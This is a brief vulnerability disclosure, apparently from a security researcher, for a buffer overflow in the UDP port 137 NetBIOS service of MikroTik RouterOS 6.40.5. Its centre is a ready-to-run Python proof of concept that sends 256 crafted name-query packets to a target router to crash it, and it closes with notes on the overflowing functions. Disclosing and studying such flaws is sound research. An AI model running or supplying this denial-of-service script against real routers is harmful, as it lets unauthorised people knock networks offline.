

# Mikrotik 6.40.5 路由器 137 接口活动参数缓冲区溢出漏洞



## 1.Basic Information



- **Vulnerability Type**: Buffer Overflow

  **Description**: A buffer overflow vulnerability exists in the Mikrotik 6.40.5 firmware. The service on UDP port 137 is vulnerable, allowing remote attackers to send specially crafted packets that trigger a buffer overflow, resulting in a Denial of Service (DoS).

  **Affected Devices and Versions**:

  - Mikrotik RouterOS 6.40.5
  - Firmware version: Mikrotik 6.40.5



## 2. Proof of Concept (PoC)

The following Python script demonstrates the vulnerability:

```py
import socket
import time

def send_netbios_name_query(target_ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    ## last byte is the brute-force target
    base_packet = bytes.fromhex(
        "82280110000100000000000024434B41414141414141414141414141414141414141414141414141414141414141414141"
    )

    for i in range(0x01, 0x100):
        packet = base_packet + bytes([i])
        print((packet))
        print(f"[+] Sending packet with last byte: {i:#04x}")
        s.sendto(packet, (target_ip, 137))
        time.sleep(0.01)  # Optional: brief delay to reduce packet loss

    print("[*] All 256 NetBIOS queries sent.")
    s.close()

send_netbios_name_query("192.168.72.140")  # Replace with your RouterOS IP
```



## 3.Exploitation Principle

A buffer overflow occurs in the sub_8060430 function, causing the return address to be overwritten. The overflow happens within the sub_8054607 function. Upon examining the function, we can see that due to the presence of a while loop, the loop only exits when v2 becomes 0; otherwise, it continuously copies data from a2 to a1.
